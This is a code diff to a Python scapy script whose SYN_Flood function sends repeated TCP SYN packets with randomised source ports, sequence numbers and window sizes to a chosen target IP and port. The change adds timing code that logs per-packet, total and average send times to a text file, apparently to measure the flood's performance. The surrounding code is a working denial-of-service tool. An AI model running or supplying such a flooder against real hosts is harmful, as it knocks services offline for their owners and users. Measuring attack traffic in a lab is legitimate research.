@@ -2,7 +2,7 @@ from os import system
 from sys import stdout
 from scapy.all import *
 from random import randint
-
+import time
 from scapy.layers.inet import TCP, IP
 
 
@@ -24,8 +24,9 @@ def randInt():
 
 def SYN_Flood(dstIP, dstPort, counter):
     total = 0
+    avg_time = 0
     print("Packets are sending ...")
-
+    attack_begin = time.process_time()
     for x in range(0, counter):
         s_port = randInt()
         s_eq = randInt()
@@ -42,10 +43,20 @@ def SYN_Flood(dstIP, dstPort, counter):
         TCP_Packet.flags = "S"
         TCP_Packet.seq = s_eq
         TCP_Packet.window = w_indow
-
+        start = time.process_time()
         send(IP_Packet / TCP_Packet, verbose=0)
-        total += 1
+        time_per_packet = (time.process_time() - start)
 
+        # Write it in a file
+        with open('syns_results_p.txt', 'a') as f:
+            f.write(f'{x}, {time_per_packet}\n')
+        avg_time = avg_time+ time_per_packet
+        total += 1
+    attack_time = time.process_time() - attack_begin
+    avg_time = avg_time/total
+    with open('syns_results_p.txt', 'a') as f:
+        f.write(f'\nTotal time - {attack_time}')
+        f.write(f'\nAverage time -{avg_time}')
     stdout.write("\nTotal packets sent: %i\n" % total)
 
 
